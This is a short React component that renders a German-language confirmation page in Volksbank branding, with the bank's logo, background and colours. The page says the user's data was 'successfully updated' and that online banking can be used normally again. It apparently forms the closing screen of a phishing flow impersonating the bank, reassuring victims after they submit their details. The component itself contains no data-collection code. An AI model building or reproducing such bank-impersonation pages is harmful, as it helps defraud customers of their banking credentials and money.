import { useEffect } from "react";
import { usePageMeta } from "@/hooks/use-page-meta";
import { CheckCircle2 } from "lucide-react";
import volksbankLogo from "@/assets/volksbank-logo.png";
import volksbankBg from "@/assets/volksbank-bg.png";
import volksbankIcon from "@/assets/volksbank.png";

const BLUE = "#196bc1";

const VolksbankBestaetigung = () => {
  usePageMeta("Volksbank - Bestätigung", volksbankIcon);
  useEffect(() => { window.scrollTo(0, 0); }, []);

  return (
    <div className="min-h-screen flex flex-col">
      <header style={{ backgroundColor: "#fff", borderBottom: "1px solid #e0e0e0" }}>
        <div className="max-w-[1200px] mx-auto flex items-center px-4 py-3">
          <img src={volksbankLogo} alt="Volksbank" className="h-10 md:h-14" />
        </div>
      </header>

      <div
        className="flex-1 flex items-center justify-center px-4 py-8"
        style={{
          backgroundImage: `url(${volksbankBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center",
          backgroundRepeat: "no-repeat",
        }}
      >
        <div className="w-full max-w-[560px] rounded overflow-hidden">
          <div className="px-6 py-4 text-white font-semibold text-xl" style={{ backgroundColor: BLUE }}>
            Aktualisierung abgeschlossen
          </div>
          <div className="bg-white px-6 py-8 space-y-4 text-center">
            <div className="flex justify-center">
              <CheckCircle2 size={64} style={{ color: BLUE }} />
            </div>
            <h2 className="text-lg font-semibold" style={{ color: "#1a3a63" }}>
              Ihre Daten wurden erfolgreich aktualisiert
            </h2>
            <p className="text-[15px]" style={{ color: "#333" }}>
              Vielen Dank! Sie können Ihr Online Banking nun wieder ganz normal verwenden.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default VolksbankBestaetigung;
